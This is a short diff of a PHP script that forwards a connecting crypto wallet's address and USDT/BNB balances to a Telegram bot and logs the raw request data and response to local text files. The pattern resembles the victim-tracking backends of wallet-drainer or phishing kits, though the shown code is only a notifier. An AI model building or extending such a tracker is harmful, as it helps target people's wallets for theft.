@@ -14,18 +14,21 @@ $bnb = $data['bnb'] ?? 0;
 
 // Format message
 $message = "🔔 *New Wallet Connected*\n"
-         . "Type: `$type`\n"
-         . "👛 Wallet: `$wallet`\n"
-         . "💵 USDT: *$usdt*\n"
-         . "🪙 BNB: *$bnb*";
+         . "👛 *Wallet:* `$wallet`\n"
+         . "💵 *USDT:* `$usdt`\n"
+         . "🪙 *BNB:* `$bnb`";
 
 // Telegram API URL
 $url = "https://api.telegram.org/bot$botToken/sendMessage";
 
 // Send message
-file_get_contents($url . '?' . http_build_query([
+$response = file_get_contents($url . '?' . http_build_query([
     'chat_id' => $chatId,
     'text' => $message,
     'parse_mode' => 'Markdown'
 ]));
+
+// Optional: Log to file for debugging
+file_put_contents("log.txt", json_encode($data));
+file_put_contents("telegram_response.txt", $response);
 ?>
